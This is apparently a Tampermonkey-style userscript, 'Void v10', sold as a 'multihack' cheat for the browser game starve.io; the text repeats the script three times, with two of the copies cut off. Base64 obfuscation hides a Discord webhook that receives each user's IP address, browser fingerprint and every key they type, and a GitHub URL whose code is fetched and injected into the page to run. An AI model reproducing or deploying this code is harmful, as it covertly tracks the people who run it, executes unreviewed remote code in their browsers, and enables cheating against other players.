            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
